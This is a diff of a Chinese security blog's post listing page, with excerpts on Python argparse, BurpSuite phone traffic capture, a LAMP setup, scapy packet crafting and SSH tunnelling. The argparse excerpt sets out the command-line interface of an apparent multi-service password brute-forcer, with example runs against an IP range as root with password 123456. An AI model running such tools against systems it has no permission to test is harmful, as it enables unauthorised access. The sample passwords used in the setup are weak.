-    [<a href="/categories/Python">Python</a>](<a href="/tags/python">python</a>,<a href="/tags/module">module</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 argparse 模块 参考 https://docs.python.org/zh-cn/3.7/library/argparse.html #!/usr/bin/env python # -*- coding: utf-8 -*- import argparse class Parser(object): &#34;&#34;&#34;Parser&#34;&#34;&#34; def __init__(self): super(Parser, self).__init__() self.service_type_list = [ &#34;ssh&#34;,&#34;telnet&#34;,&#34;ftp&#34;, &#34;mysql&#34;,&#34;mssql&#34;,&#34;oracle&#34;,&#34;pgsql&#34;,&#34;redis&#34; ] self.log_level = [&#34;debug&#34;, &#34;info&#34;, &#34;warning&#34;, &#34;error&#34;, &#34;critical&#34;] self.example = &#34;&#34;&#34;Example: \r python3 {} -s ssh -i 123.123.123.123 \r python3 {} -s ssh -i 123.123.123.123/24 -l root -p 123456&#34;&#34;&#34; def parser(self): parser<a href="https://wyb0.com/posts/2016/python-parames-parse/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/">BurpSuite 抓手机包</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-13</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/tools">tools</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 环境设置 Windows Phone手机和电脑处于同一无线环境下： 0x01 BurpSuite设置 0x02 抓HTTP包 0x03 抓HTTPS包 挂burpsu<a href="https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/">Linux 下虚拟主机搭建多站点</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-12</time>
-    [<a href="/categories/Server">Server</a>](<a href="/tags/server">server</a>)
-</div>
-
-  <div class="summary-body">
-    <p>环境：CentOS-6.5-x86_64-minimal 0x00 搭建LAMP 安装Apache yum install httpd 安装MySQL yum install mysql mysql-server 设置数<a href="https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/python-module-scapy/">Python 的 scapy 模块简单使用</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-11</time>
-    [<a href="/categories/Python">Python</a>](<a href="/tags/python">python</a>,<a href="/tags/module">module</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 简单尝试 0x01 生成一组数据包 0x02 发送数据包 send发送数据包 sr1发送数据包 sr发送数据包 0x03 发送SYN数据包 0x04 得到TCP内容<a href="https://wyb0.com/posts/2016/python-module-scapy/"> more...</a></p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/">Web常见漏洞脑图</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-11</time>
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/mindmap">mindmap</a>)
-</div>
-
-  <div class="summary-body">
-    <p>Web常见漏洞</p>
-  </div>
-</article>
-
-		
-			<article>
-  <h1 class="summary-title"><a href="https://wyb0.com/posts/2016/linux-ssh-connect/">SSH 免密登录及 SSH 隧道</a></h1>
-  
-<div class="post-meta">
-    <time>2016-08-10</time>
-    [<a href="/categories/Linux">Linux</a>](<a href="/tags/%E9%9A%A7%E9%81%93">隧道</a>,<a href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91">端口转发</a>)
-</div>
-
-  <div class="summary-body">
-    <p>0x00 SSH相关选项 -V 显示版本 -f 输入密码后进入后台模式 -N 不执行远程命令，一般与-f连用，用于端口转发 -C 压缩传输的数据，网速快<a href="https://wyb0.com/posts/2016/linux-ssh-connect/"> more...</a></p>
-  </div>
-</article>
-
-		
-		<div>
-  
-    <a href="/page/8/">Previous Page</a>
-  
-  9 of 18
-  
-    <a href="/page/10/">Next Page</a>
-  
-</div>
-
-	</main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+Example:
+  python3 tmp.py -s ssh -i 123.123.123.123
+  python3 tmp.py -s ssh -i 123.123.123.123/24 -l root -p 123456
+</code></pre></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/>BurpSuite 抓手机包</a></h1><div class=post-meta><time>2016-08-13</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/tools>tools</a>)</div><div class=summary-body><p><h3 id=0x00-环境设置>0x00 环境设置</h3><p>Windows Phone手机和电脑处于同一无线环境下：
+<img src=/img/post/burpsuite_pc_ip.png alt=PC机的ip>
+<img src=/img/post/burpsuite_ip_set.png alt=IP设置></p><h3 id=0x01-burpsuite设置>0x01 BurpSuite设置</h3><p><img src=/img/post/burpsuite_set_phone_proxy1.png alt=设置burpsuite抓8888端口的包1>
+<img src=/img/post/burpsuite_set_phone_proxy2.png alt=设置burpsuite抓8888端口的包2></p><h3 id=0x02-抓http包>0x02 抓HTTP包</h3><p><img src=/img/post/burpsuite_phone_visit_internet.png alt=手机访问网络>
+<img src=/img/post/burpsuite_get_phone_packet.png alt=burpsuite抓手机包></p><h3 id=0x03-抓https包>0x03 抓HTTPS包</h3><ul><li><p>挂burpsuite的代理下载证书
+<img src=/img/post/burpsuite_down_ca1.png alt=下载证书1>
+<img src=/img/post/burpsuite_down_ca2.png alt=下载证书2></p><a href=https://wyb0.com/posts/2016/burpsuite-intercept-packets-of-phone/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/>Linux 下虚拟主机搭建多站点</a></h1><div class=post-meta><time>2016-08-12</time>
+[<a href=/categories/Server>Server</a>](<a href=/tags/server>server</a>)</div><div class=summary-body><p><p>环境：CentOS-6.5-x86_64-minimal</p><h3 id=0x00-搭建lamp>0x00 搭建LAMP</h3><ul><li><p>安装Apache</p><pre tabindex=0><code>yum install httpd
+</code></pre></li><li><p>安装MySQL</p><ul><li>yum install mysql mysql-server</li><li>设置数据库</li></ul><pre tabindex=0><code>[reber@localhost conf]$ sudo mysql_secure_installation
+# 更新root密码：
+[reber@localhost conf]$ mysql -uroot –p
+mysql&gt; use mysql;
+mysql&gt; update user set password=password(&#39;123456&#39;) where user=&#39;root&#39;;
+mysql&gt; flush privileges;  //不想重启mysql就使新密码生效就需要运行此命令刷新
+mysql&gt; insert into mysql.user(Host,User,Password) values(&#34;localhost&#34;,&#34;blog&#34;,password(&#34;123456&#34;));
+# mysql&gt; detele form mysql.user where User=&#39;blog&#39; and Host=&#39;localhost&#39;;  //这步可以删除用户
+mysql&gt; flush privileges;  //刷新
+mysql&gt; create database db_blog;
+Query OK, 1 row affected (0.00 sec)
+# 授权用户&#34;blog&#34;拥有db_blog数据库的所有权限
+mysql&gt; grant all privileges on db_blog.* to blog@localhost identified by &#39;666666&#39;;
+mysql&gt; flush privileges;  //刷新
+[reber@localhost conf]$ mysql –ublog –p  //此时就需要用666666登陆数据库db_blog
+</code></pre></li><li><p>安装PHP</p><a href=https://wyb0.com/posts/2016/linux-virtual-host-build-multi-site/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/python-module-scapy/>Python 的 scapy 模块简单使用</a></h1><div class=post-meta><time>2016-08-11</time>
+[<a href=/categories/Python>Python</a>](<a href=/tags/python>python</a>,<a href=/tags/module>module</a>)</div><div class=summary-body><p><h3 id=0x00-简单尝试>0x00 简单尝试</h3><p><img src=/img/post/scapy_establish_the_packet.png alt=尝试构造数据包></p><h3 id=0x01-生成一组数据包>0x01 生成一组数据包</h3><p><img src=/img/post/scapy_create_a_set_of_packet.png alt=生成一组数据包></p><h3 id=0x02-发送数据包>0x02 发送数据包</h3><ul><li><p>send发送数据包
+<img src=/img/post/scapy_send_send_packet.png alt=用send发送数据包></p></li><li><p>sr1发送数据包
+<img src=/img/post/scapy_sr1_send_packet.png alt=用sr1发送数据包></p></li><li><p>sr发送数据包
+<img src=/img/post/scapy_sr_send_packet.png alt=用sr1发送数据包></p></li></ul><h3 id=0x03-发送syn数据包>0x03 发送SYN数据包</h3><p><img src=/img/post/scapy_sr1_send_syn_packet.png alt=用sr1发送syn数据包></p><p><img src=/img/post/scapy_sr_send_syn_packet.png alt=用sr发送syn数据包></p><h3 id=0x04-得到tcp内容>0x04 得到TCP内容</h3><p><img src=/img/post/scapy_get_tcp_content.png alt=得到tcp内容></p><a href=https://wyb0.com/posts/2016/python-module-scapy/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/mind-map-of-web-common-vulnerabilities/>Web常见漏洞脑图</a></h1><div class=post-meta><time>2016-08-11</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/mindmap>mindmap</a>)</div><div class=summary-body><p><h2 id=web常见漏洞>Web常见漏洞</h2><p><a href=/img/post/web_common_vulnerability_maps.png?_blank><img src=/img/post/web_common_vulnerability_maps.png alt=Web常见漏洞脑图></a></p></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/linux-ssh-connect/>SSH 免密登录及 SSH 隧道</a></h1><div class=post-meta><time>2016-08-10</time>
+[<a href=/categories/Linux>Linux</a>](<a href=/tags/%E9%9A%A7%E9%81%93>隧道</a>,<a href=/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91>端口转发</a>)</div><div class=summary-body><p><h3 id=0x00-ssh相关选项>0x00 SSH相关选项</h3><ul><li><p>-V 显示版本</p></li><li><p>-f 输入密码后进入后台模式</p></li><li><p>-N 不执行远程命令，一般与-f连用，用于端口转发</p></li><li><p>-C 压缩传输的数据，网速快时会影响速度</p><a href=https://wyb0.com/posts/2016/linux-ssh-connect/>more...</a></p></div></article><div><a href=/page/8/>Previous Page</a>
+9 of 18
+<a href=/page/10/>Next Page</a></div></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
